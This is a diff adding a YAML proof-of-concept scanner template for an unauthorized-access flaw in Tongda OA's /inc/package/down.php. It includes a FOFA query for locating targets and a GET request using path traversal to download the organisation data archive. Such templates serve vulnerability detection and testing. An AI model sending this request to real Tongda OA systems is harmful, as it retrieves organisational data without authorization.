@@ -1,0 +1,20 @@
+id: poc-yaml-tong-da-oa-incpackagedown-php-interface-unauthorized-access
+info:
+  name: 通达OA incpackagedown.php接口未授权访问漏洞
+  severity: high
+  tags:
+  - 未授权访问
+  finger: 通达OA
+  fofa: app="TDXK-通达OA"
+requests:
+- method: GET
+  path: /inc/package/down.php?id=../../../cache/org
+  expression: 'status_code == 200
+
+    && contains(body,"org.xml")
+
+    && contains(headers,"org.zip")
+
+    '
+variables: {}
+transport: http
